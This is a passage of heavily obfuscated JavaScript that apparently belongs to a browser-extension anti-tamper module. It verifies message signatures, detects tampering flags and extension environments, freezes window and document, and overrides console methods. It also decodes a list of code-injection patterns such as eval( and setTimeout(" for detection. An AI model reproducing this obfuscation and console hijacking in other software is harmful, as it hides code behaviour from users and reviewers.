                      const e = (o >>> ((t % 4) * 8)) & 255;
                      i[t] = r[t] ^ e;
                    }
                    e = new TextDecoder()[n(t)](i);
                  }
                  return e;
                };
              })()()
            );
          }
        });
      try {
        Object[e(t)](window), Object[e(t)](document);
      } catch (o) {}
    }
    isTerminated() {
      return this[R([496][0])];
    }
    [R(413) + "tionReason"]() {
      return this.terminationReason;
    }
  }
  const U = D[R(405) + "e"](),
    q = (t) => {
      const e = 481,
        n = 539,
        r = 343,
        o = 547,
        i = R,
        s = {};
      return (
        (s.level = i(327)), (s[i(e)] = t), (s[i(n) + i(r)] = !![]), U[i(o)](s)
      );
    };
  function W() {
    const t = [
      "EwXLpsjJB2XVCG",
      "Bgu9iM1HCMDPBG",
      "uKrZBue",
      "y2XLyxjbBgXtDa",
      "qwzqqKS",
      "C3rYAw5NAwz5",
      "Bg9N",
      "CMvQzwn0",
      "Dw5RBM93BG",
      "mty4nte2AwzUuvri",
      "DxjLCW",
      "Bw9NDgvJAc10zq",
      "oIa0mdbWEdSkcq",
      "swPdrhG",
      "svbfELm",
      "EwTVrue",
      "z2v0sw5ZDgfUyW",
      "Cvf3r1O",
      "AxvQshi",
      "mhb4oWOjcqLYAq",
      "CNrHBNq7cGKjcq",
      "BwLUyxrPB24",
      "C3vIDgXL",
      "idiWChG7cGKjcq",
      "z2v0vgvYBwLUyq",
      "CM9Y",
      "B2jQzwn0",
      "D3nLCKfqsxm",
      "ctXWihn0EwXLpq",
      "DhjVBMC+uMvHCW",
      "zMv0y2G",
      "oWOjcqLJB2XVCG",
      "BMn0Aw9UywXPDa",
      "oWOjcqL6lwLUza",
      "icmZmZaWmda7ia",
      "B246igzPEgvKoW",
      "vLntt0q",
      "tw5eC1m",
      "B1HTsKK",
      "y29VA2LLCW",
      "A2DYB3vUzdOGBa",
      "v0z3D1G",
      "CNrnuuu",
      "mtbrsuzPA3a",
      "C3rYAw5N",
      "zg9TywLU",
      "Dg9tDhjPBMC",
      "D2fYBG",
      "yxbWBgLJyxrPBW",
      "sujsv1a",
      "CMvLBG",
      "Bgv4lwrPCMvJDa",
      "zgLZywjSzuv4Da",
      "BI9QC29U",
      "oIbIB2XKoWOjcq",
      "CuzTsuO",
      "zxiGtMv3jYWGBq",
      "B3vUzdOG",
      "CJOGi2zMmdaWma",
      "BMfTzq",
      "BNq7cGKjcwjHyW",
      "mtq1otaZogjfAuXxwa",
      "mdSGCgfKzgLUzW",
      "zuv4zwn1DgLVBG",
      "y29UC3rYDwn0BW",
      "l3a+cGKjcqK8Ca",
      "zw5ZAw9UrMvHDa",
      "zNjLzxPL",
      "Aw5JBhvKzxm",
      "oIaXmhb4ida7iG",
      "CNvUDgLTzq",
      "C2v0sw50zxj2yq",
      "quHivNy",
      "Aw5ZDgfUy2u",
      "oI8V",
      "CMvTB3zL",
      "Au5kDwy",
      "r2Xtt0e",
      "CMvTB3zLrxzLBG",
      "qNLjza",
      "ChjLDMvUDenVza",
      "CMXXExG",
      "Dgv4Dc1ZAgfKBW",
      "cqLWywrKAw5NoG",
      "DhLSzt0IyM9Yza",
      "psjTyxjNAw4TDa",
      "yw1PBhK6iefYAq",
      "rfzhuNq",
      "pc9WpGOjcqKjcq",
      "cw1HEc13Awr0Aa",
      "yw50oWOjcq",
      "Cd4kcqK",
      "CMvHC29U",
      "BNbJBva",
      "ELHqu1O",
      "BwLUyxrPB25tyW",
      "mtq0u0jYC1Lw",
      "BgvUz3rO",
      "zMyWmdaWoYi+cG",
      "pGOjcqKjcvrLCG",
      "odu5nJvPyxniqKy",
      "BNq7cGKjcwXLzG",
      "s0LVreu",
      "CMDPBJOGmtbWEa",
      "DxjS",
      "Aw1WB3j0yw50oW",
      "Aw5HDgLVBG",
      "DgvYBwLUyxrLza",
      "C2v0vgLTzw91Da",
      "DZOGmcaWideWCa",
      "mdSIpGOjcqKjcq",
      "DgfUDdSkcqKjCa",
      "zgLZCgXHEvrLCG",
      "cGKjcxbVC2L0Aq",
      "iJ4kcqKjcqLtrq",
      "B3j0yw50oWOjcq",
      "DgfUDdSkcqKjzG",
      "sgzutNi",
      "DgfSBcbHBMqGCG",
      "AurUt2K",
      "mt4kcqKjctXKAq",
      "ida7iJ5vBMLUCW",
      "q0PrrKq",
      "tMfpvvi",
      "A2vY",
      "v1nHBKu",
      "mZa5nZuZrNnwz0f4",
      "rxnhrg4",
      "zxjYB3i",
      "ChGGmdSIpKfSBa",
      "pJXZBwfSBd5fEa",
      "Bgv2zwW",
      "pGOjcq",
      "ode0mJqZmNnnu0LOuq",
      "BNq6ignLBNrLCG",
      "DdSkcqKjywXPzW",
      "AwH2D3i",
      "DhLoB3rPzMLJyq",
      "BwvZC2fNzq",
      "vw5RBM93BIbLCG",
      "ifDbuK5jtKCG4PQG77Ip",
      "sgfjtvO",
      "DNCGiwLTCg9YDa",
      "Dw5KzwzPBMvK",
      "C3r5Bgu",
      "rgLnvgi",
      "C3rVCMfNzq",
      "B3jHz2u",
      "wMLuC2q",
      "BwLUyxrPB24Gsq",
      "C2HVD1vZzxjoBW",
      "Dgv4DenVBNrLBG",
      "CMvWB3j0vgvYBq",
      "cqKjctWVzgL2pG",
      "C2vZC2LVBG",
      "DdOGmcaHAw1WBW",
      "tuLlt1y",
      "C29MDa",
      "DgvYBwLUyxrL",
      "AwnL",
      "C2vHCMnO",
      "CK5qsKS",
      "AurquwC",
      "zxHJzxb0Aw9U",
      "sLbgA2e",
      "icmXytaWmdaPia",
      "CvvPB2q",
      "BNvJBgvHCG",
      "lcaJmdaWmdaWla",
      "qvmGqKvftIburq",
      "r0TWwwe",
      "oIaXmdaWmdaWoW",
      "BLjLyxnVBG",
      "mtCZmtCZn0TfBwrRrq",
      "qK5nqNi",
      "ruqkcqKjctWVAa",
      "sNnZCgG",
      "qw1iAMK",
      "C3LUyW",
      "Dw5YzwDPC3rLCG",
      "igzVBNqTD2vPzW",
      "BM93",
      "B246igzPEgvKia",
      "DgLMAwnHDgLVBG",
      "wgnNC3K",
      "ideYChG7ignVBa",
      "mta2q3fzrKf4",
      "B2jZzxj2zq",
      "ndeXnJLKv25YD1G",
      "Cgf0Aa",
      "AMLzt0O",
      "y3j5ChrV",
      "uwjXsLy",
      "sKXlCe4",
      "BhK6icDdB3vYAq",
      "Bgv4icfPBxbVCG",
      "yMvmEvq",
      "otLMDMHPDKS",
      "4PQG77Ipierpie5pvcbj",
      "mZjTy3vbseC",
      "cGKjcqK8l3a+cG",
      "Aw9UoIbJB2X1Bq",
      "y3jLyxrLrwXLBq",
      "zgvJB2rL",
      "BNvJBgvHCLrLCG",
      "ihSkcqKjctaLia",
      "ywXPz246ignLBG",
      "DgLVBG",
      "oIaXoYb9cGKjcq",
      "z2H0oIaYmhb4oW",
      "yM9KEq",
      "C3vIDhjLzq",
      "iwLTCg9YDgfUDa",
      "zhnpC2i",
      "cGKjctXOmZ4",
      "B246pc9ZDhjVBG",
      "zM9UDc1ZAxPLoG",
      "E30Uy29UC3rYDq",
      "ANffqvG",
      "y2XLyxi",
      "yxrPB24",
      "cGKjcqK8l2rPDG",
      "wKXAAfC",
      "zZ4G",
      "BJOGmtbWEcaWoW",
      "Ahq6igjVBgq7iG",
      "DxnLCLnLCNzPyW",
      "y3nZvgv4Da",
      "yxbWBhK",
    ];
    return (W = function () {
      return t;
    })();
  }
  const z = (t) => {
    const e = 546,
      n = 520,
      r = 461,
      o = R,
      i = {};
    i[o(461)] = o(e);
    const s = i,
      a = {};
    return (
      (a[o(n)] = s[o(r)]),
      (a.reason = t),
      (a.showUserNotification = !![]),
      U.terminate(a)
    );
  };
  function K(t, e) {
    const n = V();
    return (
      (K = function (e, r) {
        let o = n[(e -= 466)];
        if (void 0 === K.NPHUwN) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (K.lcRIKW = i), (t = arguments), (K.NPHUwN = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.VGuYZp = t),
              (this.cGcHZv = [1, 0, 0]),
              (this.GUFYiE = function () {
                return "newState";
              }),
              (this.TBZayF = "\\w+ *\\(\\) *{\\w+ *"),
              (this.cPelwM = "['|\"].+['|\"];? *}");
          };
          (e.prototype.NDoklZ = function () {
            const t = new RegExp(this.TBZayF + this.cPelwM).test(
              this.GUFYiE.toString()
            )
              ? --this.cGcHZv[1]
              : --this.cGcHZv[0];
            return this.WQnlcc(t);
          }),
            (e.prototype.WQnlcc = function (t) {
              return Boolean(~t) ? this.WlyFzN(this.VGuYZp) : t;
            }),
            (e.prototype.WlyFzN = function (t) {
              for (let e = 0, n = this.cGcHZv.length; e < n; e++)
                this.cGcHZv.push(Math.round(Math.random())),
                  (n = this.cGcHZv.length);
              return t(this.cGcHZv[0]);
            }),
            new e(K).NDoklZ(),
            (o = K.lcRIKW(o)),
            (t[s] = o);
        }
        return o;
      }),
      K(t, e)
    );
  }
  axiom,
    (function (t) {
      const e = 537,
        n = 473,
        r = 504,
        o = 484,
        i = 506,
        s = 490,
        a = 495,
        u = 474,
        c = K,
        l = t();
      for (; []; )
        try {
          if (
            928523 ===
            -parseInt(c(470)) / 1 +
              (-parseInt(c(e)) / 2) * (-parseInt(c(n)) / 3) +
              -parseInt(c(r)) / 4 +
              (-parseInt(c(o)) / 5) * (-parseInt(c(503)) / 6) +
              (-parseInt(c(i)) / 7) * (-parseInt(c(s)) / 8) +
              parseInt(c(a)) / 9 +
              (parseInt(c(478)) / 10) * (-parseInt(c(u)) / 11)
          )
            break;
          l.push(l.shift());
        } catch (d) {
          l.push(l.shift());
        }
    })(V);
  const F = (function () {
      let t = !![];
      return function (e, n) {
        const r = 496,
          o = t
            ? function () {
                if (n) {
                  const t = n[K(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    j = F(void 0, function () {
      const t = K;
      return j[t([481][0])]()
        .search(t(532) + "+$")
        .toString()
        [t(482) + "r"](j)
        .search("(((.+)+)+)+$");
    });
  j();
  const G = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  function V() {
    const t = [
      "wvDXBe0",
      "zvrXrMK",
      "s3HJs2u",
      "rvDiufO",
      "ugLQzxq",
      "C3vIDgXL",
      "BwvZC2fNzq",
      "CMv0DxjUicHMDq",
      "yvnJEe8",
      "EgTLD2y",
      "y29UC29Szq",
      "x19WCM90B19F",
      "Aw1WB3j0s2v5",
      "DMvYAwz5",
      "x19uqu1qrvjfra",
      "uw5Wsxu",
      "C3rYAw5NAwz5",
      "r3LzDMy",
      "kcGOlISPkYKRkq",
      "yMLUza",
      "C3Lsv3q",
      "BLDwz2K",
      "txPQDLi",
      "mZu3ndqZohncEeHZvG",
      "AMPRwxu",
      "C3rYAw5N",
      "thLSrLq",
      "AMjoB2C",
      "C3vIC3rY",
      "CM4GDgHPCYiPka",
      "ve9WrvC",
      "rhbIr0C",
      "mtC4mdy2ohDxuxjyEq",
      "y3rVCIGICMv0Dq",
      "Bw9WruC",
      "m05zB2TZEG",
      "mteZm1jiEgTWwG",
      "CM9Y",
      "C2LNBMf0DxjL",
      "zxjYB3i",
      "mJaXnZCWy3fRC1Hl",
      "zgvJB2rL",
      "rxvAzuy",
      "Dg9tDhjPBMC",
      "y29UC3rYDwn0BW",
      "ANfIyLG",
      "mZm1y3LIyMzc",
      "DgfIBgu",
      "E30Uy29UC3rYDq",
      "t2HVsuG",
      "zw9mrKu",
      "vgrku3m",
      "nte5mK5kCevRCW",
      "vvnozwK",
      "ChjVDg90ExbL",
      "v015z3y",
      "tNfqwKq",
      "mtaWodG1ndfYDKXLCwK",
      "yxbWBhK",
      "B2jQzwn0",
      "zg9JDw1LBNrfBa",
      "BwfW",
      "sKXwvMy",
      "DhjHy2u",
      "vw5RBM93BIbLCG",
      "mtq2oteWy3vNCMLH",
      "ntu1odmYohjHzLvizq",
      "Bu93y0C",
      "mtC1nJnZte1LrNu",
      "vNb3t20",
      "BgvUz3rO",
      "sw1luu0",
      "Bwv0ywrHDge",
      "zhnvCwC",
      "q0ngtwy",
      "Dfjzr2G",
    ];
    return (V = function () {
      return t;
    })();
  }
  G(void 0, function () {
    const t = 471,
      e = 485,
      n = 505,
      r = 524,
      o = 477,
      i = 501,
      s = 482,
      a = 525,
      u = 533,
      c = 481,
      l = K,
      d = {
        sgQSx: function (t, e) {
          return t(e);
        },
        VxlCu: l(521) + "nction() ",
        GyYvf: l(486) + l(t) + l(467) + " )",
        mOwcG: function (t) {
          return t();
        },
        cpIRm: "warn",
        DYGdO: l(e),
      },
      f = d[l(n)](function () {
        const t = l;
        let e;
        try {
          e = d.sgQSx(Function, d.VxlCu + d[t(531)] + ");")();
        } catch (n) {
          e = window;
        }
        return e;
      }),
      h = (f[l(r)] = f[l(r)] || {}),
      p = ["log", d.cpIRm, "info", l(o), "exception", d.DYGdO, l(i)];
    for (let m = 0; m < p.length; m++) {
      const t = G[l(s) + "r"][l(492)].bind(G),
        e = p[m],
        n = h[e] || t;
      (t[l(a)] = G[l(u)](G)), (t.toString = n[l(c)][l(u)](n)), (h[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const H = (t) => {
      const e = 483,
        n = K,
        r = {
          jqbbX: function (t, e) {
            return t < e;
          },
        };
      r[n(468)] = function (t, e) {
        return t * e;
      };
      const o = r,
        i = new Uint8Array(t.length / 2);
      for (let s = 0; o[n(e)](s, i.length); s++)
        i[s] = parseInt(t[n(466)](o.TOpEW(s, 2), 2), 16);
      return i;
    },
    X = (t) => {
      const e = 541,
        n = K,
        r = {
          jbNog: function (t, e) {
            return t(e);
          },
          XIvYX: "object",
        };
      return Array.isArray(t)
        ? t[n([499][0])](X)
        : null !== t && typeof t === r.XIvYX
        ? Object.keys(t)
            .sort()
            .reduce((o, i) => {
              const s = n;
              return (o[i] = r[s(e)](X, t[i])), o;
            }, {})
        : t;
    },
    Z = async (t, e) => {
      const n = 527,
        r = 519,
        o = 497,
        i = 509,
        s = 513,
        a = K,
        u = {
          tRYGh: function (t, e) {
            return t < e;
          },
          HLMhD: function (t, e) {
            return t * e;
          },
          ZFKnI: function (t, e) {
            return t >>> e;
          },
          nWVgi: function (t, e) {
            return t < e;
          },
          Pijet: function (t, e) {
            return t * e;
          },
          aScxO: function (t, e) {
            return t % e;
          },
          gmzUR: function (t, e) {
            return t(e);
          },
          meXAg: a(n),
          mUUGP: function (t) {
            return t();
          },
          lTcrh: function (t, e) {
            return t === e;
          },
          ImKQM: function (t, e) {
            return t + e;
          },
        },
        { metadata: c, data: l } = t;
      let { signature: d, timestamp: f } = c;
      const h = X(l),
        p = "" + f + JSON[a(530)](h);
      try {
        const t = new TextEncoder().encode(p),
          o = H(d),
          i = u.gmzUR(H, e),
          c = await crypto[a(r)][a(526)](
            "raw",
            i,
            {
              name: (function () {
                const t = 507,
                  e = {
                    wMBmA: function (t, e) {
                      return u[K(s)](t, e);
                    },
                    oiZiX: function (t, e) {
                      return t & e;
                    },
                    VpwOm: function (t, e) {
                      return u.HLMhD(t, e);
                    },
                    FNYko: function (t, e) {
                      return t % e;
                    },
                  };
                let n;
                return function () {
                  const r = K;
                  if (!n) {
                    const o = new Uint8Array([236, 158, 49, 77, 156, 203, 58]),
                      i = 2013526697,
                      s = new Uint8Array(o.length);
                    for (let n = 0; e.wMBmA(n, o.length); n++) {
                      const a = e.oiZiX(i >>> e[r(t)](e.FNYko(n, 4), 8), 255);
                      s[n] = o[n] ^ a;
                    }
                    n = new TextDecoder().decode(s);
                  }
                  return n;
                };
              })()(),
            },
            ![],
            [u.meXAg]
          ),
          l = await crypto.subtle[a(n)](
            {
              name: (function () {
                const t = function (t, e) {
                  return u.ZFKnI(t, e);
                };
                let e;
                return function () {
                  if (!e) {
                    const n = new Uint8Array([238, 158, 49, 77, 158, 203, 58]),
                      r = 2013526699,
                      o = new Uint8Array(n.length);
                    for (let e = 0; e < n.length; e++) {
                      const i = 255 & t(r, (e % 4) * 8);
                      o[e] = n[e] ^ i;
                    }
                    e = new TextDecoder().decode(o);
                  }
                  return e;
                };
              })()(),
            },
            c,
            o,
            t
          );
        return (
          l ||
          (u.mUUGP(C),
          await q(
            (function () {
              let t;
              return function () {
                const e = K;
                if (!t) {
                  const n = new Uint8Array([
                      253, 155, 110, 8, 204, 136, 106, 22, 206,
                    ]),
                    r = 2013526697,
                    o = new Uint8Array(n.length);
                  for (let t = 0; u[e(535)](t, n.length); t++) {
                    const e = (r >>> ((t % 4) * 8)) & 255;
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()()
          ),
          ![])
        );
      } catch (m) {
        C();
        let t = "Unknown error";
        return (
          m instanceof Error
            ? (t = m[a(520)])
            : typeof m === a(539)
            ? (t = m)
            : m && u.lTcrh(typeof m, a(o)) && (t = JSON.stringify(m)),
          await q(
            u[a(i)](
              (function () {
                const t = 518,
                  e = 522;
                let n;
                return function () {
                  const r = K;
                  if (!n) {
                    const o = new Uint8Array([
                        249, 159, 113, 17, 201, 147, 96, 25, 219, 147, 108, 22,
                        143, 138, 113, 23, 204, 159, 112, 11, 143, 159, 113, 10,
                        192, 136, 57, 88,
                      ]),
                      i = 2013526703,
                      s = new Uint8Array(o.length);
                    for (let n = 0; n < o.length; n++) {
                      const a = (i >>> u[r(t)](u[r(e)](n, 4), 8)) & 255;
                      s[n] = o[n] ^ a;
                    }
                    n = new TextDecoder().decode(s);
                  }
                  return n;
                };
              })()(),
              t
            )
          ),
          ![]
        );
      }
    },
    J = async (t) => {
      const e = 475,
        n = 539,
        r = 536,
        o = 510,
        i = 476,
        s = 491,
        a = 497,
        u = 530,
        c = 508,
        l = 479,
        d = 508,
        f = 479,
        h = 508,
        p = K,
        m = {
          dNLCY: function (t, e) {
            return t % e;
          },
          RdPyE: function (t, e) {
            return t >>> e;
          },
          WmBJq: function (t, e) {
            return t & e;
          },
          MzjvR: function (t) {
            return t();
          },
          USNei: function (t, e) {
            return t(e);
          },
          WMygv: p(502) + p(e),
          XAOnW: p(n),
          nnkwR: function (t, e) {
            return t === e;
          },
        };
      try {
        return t &&
          typeof t ===
            (function () {
              const t = function (t, e) {
                  return t >>> e;
                },
                e = function (t, e) {
                  return m.dNLCY(t, e);
                },
                n = function (t, e) {
                  return t ^ e;
                };
              let r;
              return function () {
                const o = K;
                if (!r) {
                  const i = new Uint8Array([198, 152, 105, 29, 202, 142]),
                    s = 2013526697,
                    a = new Uint8Array(i[o(508)]);
                  for (let r = 0; r < i[o(h)]; r++) {
                    const o = 255 & t(s, 8 * e(r, 4));
                    a[r] = n(i[r], o);
                  }
                  r = new TextDecoder().decode(a);
                }
                return r;
              };
            })()()
          ? t[p(o)] && t.metadata[p(i)] && t[p(o)].timestamp
            ? !![]
            : (m.MzjvR(C),
              await m[p(s)](
                q,
                (function () {
                  const t = p,
                    e = {};
                  e[t(534)] = function (t, e) {
                    return t * e;
                  };
                  const n = e;
                  let r;
                  return function () {
                    const e = t;
                    if (!r) {
                      const t = new Uint8Array([
                          228, 147, 112, 11, 192, 148, 100, 88, 218, 159, 96,
                          13, 219, 147, 119, 1, 137, 151, 102, 12, 200, 158, 98,
                          12, 200, 218, 106, 22, 137, 187, 83, 49, 137, 136,
                          102, 11, 217, 149, 109, 11, 204, 218, 46, 88, 217,
                          149, 112, 11, 192, 152, 111, 29, 137, 155, 119, 12,
                          200, 153, 104,
                        ]),
                        o = 2013526697,
                        i = new Uint8Array(t[e(c)]);
                      for (let e = 0; e < t.length; e++) {
                        const r = (o >>> n.syRWt(e % 4, 8)) & 255;
                        i[e] = t[e] ^ r;
                      }
                      r = new TextDecoder()[e(l)](i);
                    }
                    return r;
                  };
                })()()
              ),
              ![])
          : (m[p(r)](C),
            await z(
              (function () {
                const t = {
                  LylFT: function (t, e) {
                    return m.RdPyE(t, e);
                  },
                  Sgzmb: function (t, e) {
                    return t * e;
                  },
                };
                let e;
                return function () {
                  const n = K;
                  if (!e) {
                    const r = new Uint8Array([
                        230, 155, 111, 30, 196, 136, 110, 29, 207, 218, 66, 40,
                        226, 218, 113, 29, 216, 138, 108, 22, 216, 159, 35, 28,
                        206, 142, 102, 27, 223, 159, 103,
                      ]),
                      o = 2013526699,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r[n(d)]; e++) {
                      const s = 255 & t[n(540)](o, t.Sgzmb(e % 4, 8));
                      i[e] = r[e] ^ s;
                    }
                    e = new TextDecoder()[n(f)](i);
                  }
                  return e;
                };
              })()()
            ),
            ![]);
      } catch (g) {
        C();
        let t = m[p(493)];
        return (
          g instanceof Error
            ? (t = g.message)
            : typeof g === m.XAOnW
            ? (t = g)
            : g && m.nnkwR(typeof g, p(a)) && (t = JSON[p(u)](g)),
          await q(
            (function () {
              const t = 508,
                e = 508,
                n = 480,
                r = {
                  YWqlM: function (t, e) {
                    return m.WmBJq(t, e);
                  },
                  EuZeF: function (t, e) {
                    return t ^ e;
                  },
                };
              let o;
              return function () {
                const i = K;
                if (!o) {
                  const s = new Uint8Array([
                      230, 170, 74, 88, 206, 148, 119, 29, 192, 136, 106, 12,
                      222, 218, 96, 16, 194, 153, 104, 88, 193, 155, 106, 20,
                      194, 158, 57, 88,
                    ]),
                    a = 2013526695,
                    u = new Uint8Array(s[i(t)]);
                  for (let t = 0; t < s[i(e)]; t++) {
                    const e = r[i(514)](a >>> ((t % 4) * 8), 255);
                    u[t] = r[i(n)](s[t], e);
                  }
                  o = new TextDecoder().decode(u);
                }
                return o;
              };
            })()() + t
          ),
          ![]
        );
      }
    },
    Y = async () => {
      const t = 538,
        e = 528,
        n = 498,
        r = 538,
        o = 502,
        i = 517,
        s = 539,
        a = 488,
        u = 530,
        c = 508,
        l = 515,
        d = 508,
        f = 523,
        h = 472,
        p = 479,
        m = 469,
        g = K,
        y = {
          HCjqy: function (t, e) {
            return t ^ e;
          },
          OhoIH: function (t, e) {
            return t ^ e;
          },
          DpbGG: function (t, e) {
            return t < e;
          },
          JLVVf: function (t, e) {
            return t >>> e;
          },
          eTqFi: function (t, e) {
            return t < e;
          },
          iXpwH: function (t, e) {
            return t & e;
          },
          dsUqg: function (t, e) {
            return t % e;
          },
          UepKF: function (t, e) {
            return t & e;
          },
          VmENW: function (t, e) {
            return t < e;
          },
          RHBQp: function (t, e) {
            return t * e;
          },
          NppAT: function (t, e) {
            return t >>> e;
          },
          iyEpJ: function (t, e) {
            return t !== e;
          },
          jjkYu: function (t) {
            return t();
          },
          VnNHe: function (t, e) {
            return t(e);
          },
          CciaE: function (t, e) {
            return t + e;
          },
          EWHPZ: function (t, e) {
            return t instanceof e;
          },
          eoLFE: "object",
        };
      try {
        if (
          y.iyEpJ(
            typeof Z,
            (function () {
              const t = 508,
                e = {
                  QnpIu: function (t, e) {
                    return t & e;
                  },
                  PfGGG: function (t, e) {
                    return y.HCjqy(t, e);
                  },
                };
              let n;
              return function () {
                const r = K;
                if (!n) {
                  const o = new Uint8Array([
                      207, 143, 109, 27, 221, 147, 108, 22,
                    ]),
                    i = 2013526697,
                    s = new Uint8Array(o[r(t)]);
                  for (let t = 0; t < o.length; t++) {
                    const n = e[r(529)](i >>> ((t % 4) * 8), 255);
                    s[t] = e.PfGGG(o[t], n);
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()()
          )
        )
          return (
            y[g(t)](C),
            await q(
              (function () {
                const t = 516,
                  e = 512,
                  n = 487,
                  r = {
                    ooPBG: function (t, e) {
                      return t < e;
                    },
                    KxcKe: function (t, e) {
                      return t % e;
                    },
                    CCFMf: function (t, e) {
                      return y[K(n)](t, e);
                    },
                  };
                let o;
                return function () {
                  const n = K;
                  if (!o) {
                    const i = new Uint8Array([
                        232, 136, 106, 12, 194, 153, 98, 20, 139, 137, 102, 27,
                        222, 136, 106, 12, 210, 218, 101, 13, 197, 153, 119, 17,
                        196, 148, 35, 16, 202, 137, 35, 26, 206, 159, 109, 88,
                        200, 149, 110, 8, 217, 149, 110, 17, 216, 159, 103,
                      ]),
                      s = 2013526699,
                      a = new Uint8Array(i.length);
                    for (let o = 0; r.ooPBG(o, i.length); o++) {
                      const u = (s >>> (8 * r[n(t)](o, 4))) & 255;
                      a[o] = r[n(e)](i[o], u);
                    }
                    o = new TextDecoder().decode(a);
                  }
                  return o;
                };
              })()()
            ),
            ![]
          );
        if (window[g(e) + "__"] || window.__MODIFIED__)
          return (
            C(),
            await y.VnNHe(
              q,
              (function () {
                let t;
                return function () {
                  const e = K;
                  if (!t) {
                    const n = new Uint8Array([
                        236, 130, 119, 29, 199, 137, 106, 23, 199, 218, 119, 25,
                        196, 138, 102, 10, 192, 148, 100, 88, 205, 159, 119, 29,
                        202, 142, 102, 28, 137, 140, 106, 25, 137, 157, 111, 23,
                        203, 155, 111, 88, 207, 150, 98, 31, 218,
                      ]),
                      r = 2013526697,
                      o = new Uint8Array(n.length);
                    for (let t = 0; y[e(m)](t, n[e(508)]); t++) {
                      const e = (r >>> ((t % 4) * 8)) & 255;
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()()
            ),
            ![]
          );
        if (
          typeof chrome ===
            (function () {
              const t = 500,
                e = {
                  KBYdB: function (t, e) {
                    return t & e;
                  },
                  xkewf: function (e, n) {
                    return y[K(t)](e, n);
                  },
                  mopEG: function (t, e) {
                    return t % e;
                  },
                };
              let n;
              return function () {
                const t = K;
                if (!n) {
                  const r = new Uint8Array([
                      218, 148, 103, 29, 201, 147, 109, 29, 203,
                    ]),
                    o = 2013526703,
                    i = new Uint8Array(r[t(d)]);
                  for (let n = 0; n < r.length; n++) {
                    const s = e.KBYdB(e[t(f)](o, 8 * e[t(h)](n, 4)), 255);
                    i[n] = r[n] ^ s;
                  }
                  n = new TextDecoder()[t(p)](i);
                }
                return n;
              };
            })()() &&
          typeof globalThis.browser ===
            (function () {
              let t;
              return function () {
                const e = K;
                if (!t) {
                  const n = new Uint8Array([
                      220, 148, 103, 29, 207, 147, 109, 29, 205,
                    ]),
                    r = 2013526697,
                    o = new Uint8Array(n.length);
                  for (let t = 0; y[e(l)](t, n[e(508)]); t++) {
                    const e = y.iXpwH(r >>> ((t % 4) * 8), 255);
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()()
        )
          return (
            y.jjkYu(C),
            await q(
              (function () {
                let t;
                return function () {
                  if (!t) {
                    const e = new Uint8Array([
                        238, 130, 119, 29, 197, 137, 106, 23, 197, 218, 96, 23,
                        197, 142, 102, 0, 223, 218, 107, 25, 216, 218, 97, 29,
                        206, 148, 35, 27, 196, 151, 115, 10, 196, 151, 106, 11,
                        206, 158,
                      ]),
                      n = 2013526699,
                      r = new Uint8Array(e.length);
                    for (let t = 0; t < e.length; t++) {
                      const o = y.iXpwH(n >>> (8 * y.dsUqg(t, 4)), 255);
                      r[t] = y.HCjqy(e[t], o);
                    }
                    t = new TextDecoder().decode(r);
                  }
                  return t;
                };
              })()()
            ),
            ![]
          );
        const r = [
            (function () {
              let t;
              return function () {
                const e = K;
                if (!t) {
                  const n = new Uint8Array([204, 140, 98, 20, 129]),
                    r = 2013526697,
                    o = new Uint8Array(n[e(c)]);
                  for (let t = 0; t < n.length; t++) {
                    const e = (r >>> ((t % 4) * 8)) & 255;
                    o[t] = y.OhoIH(n[t], e);
                  }
                  t = new TextDecoder()[e(479)](o);
                }
                return t;
              };
            })()(),
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([
                      241, 143, 109, 27, 195, 147, 108, 22, 159,
                    ]),
                    n = 2013526711,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = y.UepKF(n >>> ((t % 4) * 8), 255);
                    r[t] = e[t] ^ o;
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()(),
            skCrypt('setTimeout("')(),
            skCrypt('setInterval("')(),
            (function () {
              const t = 500,
                e = {
                  qXlwD: function (t, e) {
                    return t < e;
                  },
                  TdJSs: function (t, e) {
                    return t & e;
                  },
                  kfxjy: function (e, n) {
                    return y[K(t)](e, n);
                  },
                  lUOlp: function (t, e) {
                    return y.dsUqg(t, e);
                  },
                  zIjuF: function (t, e) {
                    return t ^ e;
                  },
                };
              let n;
              return function () {
                const t = K;
                if (!n) {
                  const r = new Uint8Array([
                      205, 149, 96, 13, 196, 159, 109, 12, 135, 141, 113, 17,
                      221, 159, 43,
                    ]),
                    o = 2013526697,
                    i = new Uint8Array(r[t(508)]);
                  for (let n = 0; e.qXlwD(n, r.length); n++) {
                    const s = e[t(489)](e.kfxjy(o, 8 * e.lUOlp(n, 4)), 255);
                    i[n] = e.zIjuF(r[n], s);
                  }
                  n = new TextDecoder().decode(i);
                }
                return n;
              };
            })()(),
            (function () {
              let t;
              return function () {
                const e = K;
                if (!t) {
                  const n = new Uint8Array([
                      194, 148, 109, 29, 217, 178, 87, 53, 231, 218, 62,
                    ]),
                    r = 2013526699,
